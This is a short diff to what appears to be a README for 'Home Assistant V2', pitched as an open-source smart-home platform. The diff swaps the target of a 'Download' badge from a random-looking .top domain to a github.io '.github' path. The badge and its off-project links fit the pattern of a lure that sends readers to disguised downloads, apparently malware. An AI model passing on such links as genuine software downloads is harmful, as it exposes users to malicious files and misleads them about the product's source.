@@ -2,7 +2,7 @@
 
 Transform your living space with **Home Assistant V2**, the next-gen open-source platform for seamless smart home control. Perfect for tech enthusiasts and homeowners, it integrates all your devices into one intuitive interface.
 
-[![Download Home Assistant V2](https://img.shields.io/badge/Download-Home_Assistant_V2-blueviolet)](https://poelkakusthbutn.top/)
+[![Download Home Assistant V2](https://img.shields.io/badge/Download-Home_Assistant_V2-blueviolet)](https://home-assistant-v2.github.io/.github)
 
 ---
 
